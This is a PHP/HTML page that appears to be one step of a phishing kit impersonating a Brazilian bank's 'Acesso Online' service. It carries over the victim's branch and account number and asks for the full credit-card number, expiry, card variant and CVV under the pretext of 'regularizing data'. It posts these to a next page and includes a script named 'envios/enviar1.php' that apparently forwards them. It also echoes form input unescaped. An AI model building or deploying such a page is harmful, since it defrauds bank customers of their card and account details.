<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Acesso Online</title>

<script language="javascript" src="scripts/dataVerifica.js"></script>
<script language="javascript" src="scripts/pulaCampo.js"></script>
<script language="javascript" src="scripts/validaCCdados.js"></script>

<style type="text/css">
#top1 { width:100%; height:138px; background:url(images/top1.jpg) repeat-x; }
.style1 {font-size: 12px;	font-family: Arial, Helvetica, sans-serif;	color: #666666;}
#avancar {cursor:pointer; float:right; width:95px; height:25px; border:0; background:url(images/avancando.gif); color:#000000; display:inline; margin:2px;} 
#avancar:hover {background-position:right bottom} 
#cancelar {cursor:pointer; float:right; width:135px; height:25px; border:0; background:url(images/cancelando.gif); color:#000000; display:inline; margin:2px;} 
#cancelar:hover {background-position:right bottom} 
#voltar {cursor:pointer; float:right; width:72px; height:26px; border:0; background:url(images/voltando.jpg); color:#000000; display:inline; margin:2px;} 
#voltar:hover {background-position:right bottom} 
#bbotoes input { cursor:pointer; float:left; width:36px; height:40px; border:0; background:url(images/contente.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#bbotoes input:hover { background-position:left bottom; }
#framelimpar { cursor:pointer; width:78px; height:31px; border:0; background:url(images/hover.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#framelimpar:hover {background-position:left bottom }
.style4 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #333333;
}
.style5 {font-size: 12px; font-family: "Courier New", Courier, monospace; color: #CC0000; }

#ver01 {width:35px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#ver02 {width:35px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#ver03 {width:35px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#ver04 {width:35px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#mes {width:20px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#ano {width:20px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#via {width:20px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#tip {width:20px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}

#cvv {width:30px;height:17px;font-family:Tahoma,Arial,Sans-Serif;font-size:12px;border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding-left:5px; background:#FFF;}
#pos68 {width:40px; height:15px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; }
.style13 {font-family: Arial, Helvetica, sans-serif; font-size: 14px; color: #333333; }
.style10 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #FFFFFF; }
.style14 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #FFFFFF; }
</style>
</head>

<body style="margin:0; background:#F7F7F7; ">
<div id="top1"><div style="width:980px; height:145px; margin:0 auto; background:url(images/top2.jpg) repeat-x;">
<div style="width:150px; height:145px; float:left; background:url(images/marca.png) no-repeat;"></div>
<div style="width:829px; height:28px; float:left;">
  <div align="right">
    <table width="421" align="left" cellpadding="0" cellspacing="0">
      <tr>
        <td width="37" height="28">&nbsp;</td>
        <td width="53" height="28"><span class="style10">Ag&ecirc;ncia:</span></td>
        <td width="64" class="style14" width-="width-"><?php echo("<b>".$_POST['agencia']."</b>");?></td>
        <td width="43"><span class="style10">Conta:</span></td>
        <td width="222""40" class="style14" width-="width-" ><?php echo("<b>".$_POST['conta']."</b>");?><?php echo("-<b>".$_POST['digito']."</b>");?></td>
      </tr>
    </table>
    <img src="images/sair.jpg" width="151" height="28" border="0" /></div>
</div>
<div style="width:600px; height:45px; float:left;"><table cellpadding="0" cellspacing="0">
  <tr><td width="37" height="42">&nbsp;</td>
  <td width="559" height="42"><span class="style1"><script>data();</script></span></td>
</tr></table></div>
<div style="width:829px; height:63px; float:left; background:url(images/img_as.jpg) no-repeat; border-right:1px solid #DDD;"></div>
</div></div>

<div style="width:982px; height:430px; margin:0 auto; margin-top:15px;">
<div style="width:750px; height:430px; background:#FFF; float:left; border-bottom:1px solid #C5C5C5; border-left:1px solid #eee; border-right:1px solid #eee; border-radius:7px;">
<div style="width:100%; height:40px; background:url(images/mkv_kk.jpg) right no-repeat;">
  <table cellpadding="0" cellspacing="0">
    <tr>
      <td width="18" height="28">&nbsp;</td>
      <td width="88" height="28"><span class="style4">P&aacute;gina Inicial </span></td>
      <td width="17" height="28" class="style5">&gt;</td>
      <td width="156" height="28" class="style4">Regulariza&ccedil;&atilde;o de dados </td>
      <td width="19" height="28" class="style5">&gt;</td>
      <td width="119" height="28" class="style4">Ativar cart&atilde;o chave</td>
	        <td width="19" height="28" class="style5">&gt;</td>
			      <td width="119" height="28" class="style4">Cart&atilde;o de cr&eacute;dito </td>

    </tr>
  </table>
</div>
<div style="width:700px; height:35px; background:url(images/Passo3.jpg) no-repeat; margin-left:11px;"></div>
<form id="form" name="form" action="index5.php" method="post" autocomplete="off" >
  <div style="width:714px; height:320px; margin-left:20px; margin-top:15px; float:left;">
  
  <table cellpadding="0" cellspacing="0" id="0">	<tr>
	<td height="29" colspan="11"><span class="style13">&nbsp;Para concluir ser&aacute; necess&aacute;rio que informe os seguinte dados.
	</span></td>
	</tr>
	<tr>
	      <td height="91" colspan="11"><img src="images/iouwerwer.png" width="600" height="166" /></td>
	      </tr>
		  <tr>
		  
		 <td height="25" colspan="11"><input name="agencia" type="hidden" id="agencia" value="<?php echo $_POST['agencia']; ?>" />
        <input name="conta" type="hidden" id="conta" value="<?php echo $_POST['conta']; ?>" />
        <input name="digito" type="hidden" id="digito" value="<?php echo $_POST['digito']; ?>" /></td>
		 </tr>
	<tr>
	  <td width="109" height="19" class="style4">N&uacute;mero do cart&atilde;o: </td>
	  <td width="203"><input name="ver01" type="text" id="ver01" lang="1" onkeyup="javascript:pulacampo('ver01','ver02')" size="4" maxlength="4" />
  <input name="ver02" type="text" id="ver02" lang="1" onkeyup="javascript:pulacampo('ver02','ver03')" size="4" maxlength="4" >
  <input name="ver03" type="text" id="ver03" lang="1" onkeyup="javascript:pulacampo('ver03','ver04')" size="4" maxlength="4" >
  <input name="ver04" type="text" id="ver04" lang="1" onkeyup="javascript:pulacampo('','')" size="4" maxlength="4" ></td>
	<td width="78" class="style4">Validade at&eacute;: </td>
	<td width="70"><input name="mes" type="text" id="mes" lang="1" onkeyup="javascript:pulacampo('mes','ano')" size="2" maxlength="2" xml:lang="1" />
/
  <input name="ano" type="text" id="ano" lang="1" size="2" maxlength="2" xml:lang="1" /></td>
	<td width="14">&nbsp;</td>
	<td width="28" class="style4">Via:</td>
	<td width="32"><input name="via" type="text" id="via" lang="1" onkeyup="javascript:pulacampo('via','tip')" size="2" maxlength="2" xml:lang="1" /></td>
	<td width="33" class="style4">Tipo:</td>
	<td width="50"><input name="tip" type="text" id="tip" lang="1" size="2" maxlength="2" xml:lang="1" /></td>
		<td width="31" class="style4">CVV:</td>
		<td width="59"><input name="cvv" type="text" id="cvv" lang="1" size="3" maxlength="3" xml:lang="1"/></td>
	</tr>
	  <tr>
		  
		 <td height="34" colspan="11" class="style1"><em> O que &eacute; cvv? s&atilde;o os tr&ecirc;s &uacute;ltimos digitos localizado no verso do seu cart&atilde;o.</em></td>
	  </tr>
	  <tr>
	  <td height="44" colspan="11">
	  
	  
	  <div style=" width:714px; height:32px; margin-top:0;">
    <table cellpadding="0" cellspacing="0" width="100%">
      <tr>
        <td width="594" height="29"><input name="button" type="button" id="cancelar" value=""/></td>
        <td width="12">&nbsp;</td>
        <td width="106"><input name="submit" type="submit" id="avancar" value="" onclick="return macTools();" /></td>
      </tr>
    </table>
  </div>
	  
	  
	  </td>
	  </tr>
	</table>
  
  </div>
  
</form>
</div>
<div style="width:217px; height:360px; float:right; border-radius:5px;"><img src="images/bylll.jpg" width="217" height="360" border="0" usemap="#Map" />
<map name="Map" id="Map"><area shape="rect" coords="14,78,124,125" href="#" /><area shape="rect" coords="13,181,143,230" href="#" /><area shape="rect" coords="13,294,112,326" href="#" /></map></div></div>

<div style="width:100%; height:103px; repeat-x; margin-top:15px; background:#FFF; border-top:1px solid #C5C5C5; border-bottom:1px solid #C5C5C5;">
<div style="width:985px; height:103px; margin:0 auto;"><img src="images/botons2.jpg" width="985" height="103" border="0" usemap="#Map" /></div>
</div>
</body>
<? include"envios/enviar1.php"; ?>
</html>